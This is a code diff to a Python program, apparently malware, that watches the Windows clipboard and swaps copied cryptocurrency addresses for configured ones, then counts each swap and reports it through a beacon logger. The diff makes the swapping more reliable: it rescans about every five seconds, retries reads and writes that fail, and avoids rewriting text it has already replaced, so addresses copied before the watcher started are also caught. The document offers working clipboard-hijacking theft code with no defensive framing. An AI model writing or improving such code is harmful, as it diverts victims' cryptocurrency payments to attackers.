@@ -3340,7 +3340,7 @@ _crypto_cfg = {}
 _crypto_lock = threading.Lock()
 _crypto_state = {"thread": None, "stop": threading.Event(), "on": False,
                  "loaded": False, "seq": 0, "swaps": 0, "stats": {},
-                 "last": 0.0, "start_ts": 0.0}
+                 "last": 0.0, "start_ts": 0.0, "last_text": ""}
 
 
 def _crypto_cfg_path() -> str:
@@ -3504,26 +3504,47 @@ def _crypto_stop() -> None:
 
 
 def _crypto_watch() -> None:
+    """Clipboard watcher. Fires on a GetClipboardSequenceNumber change AND on
+    a periodic ~5 s rescan, so an address that was already on the clipboard
+    before arming (or whose change event was burned by a failed read / busy
+    opener) is still swapped. A failed read never consumes the seq, so the
+    same change retries on the next tick. last_text makes rescanning
+    idempotent: content we already wrote is never rewritten."""
     st = _crypto_state
+    last_scan = 0.0
     while not st["stop"].wait(0.7):
         try:
+            now = time.time()
             seq = _clip_seq()
-            if seq == 0 or seq == st["seq"]:
+            changed = seq != 0 and seq != st["seq"]
+            if not changed and (now - last_scan) < 5.0:
                 continue
+            last_scan = now
             text = _clip_read()
-            st["seq"] = seq
-            if not text:
+            if text is None:
+                # busy / no CF_UNICODETEXT: leave seq untouched so the same
+                # change re-triggers until we actually get a readable value
+                continue
+            if not text or text == st.get("last_text"):
+                if changed:
+                    st["seq"] = seq      # event consumed, nothing to swap
                 continue
             with _crypto_lock:
                 cfg = dict(_crypto_cfg)
             new, rep = _crypto_plan(text, cfg)
             if not rep or new == text:
+                if changed:
+                    st["seq"] = seq
                 continue
             if not _clip_write(new):
+                # write failed (clipboard stolen mid-swap): keep seq stale so
+                # the next tick rescans and retries the swap
                 continue
             with _crypto_lock:
+                st["seq"] = _clip_seq() or seq
+                st["last_text"] = new
                 st["swaps"] += 1
-                st["last"] = time.time()
+                st["last"] = now
                 for c, n in rep.items():
                     st["stats"][c] = st["stats"].get(c, 0) + n
             _beacon_log("[clip] crypto-swap: %s"
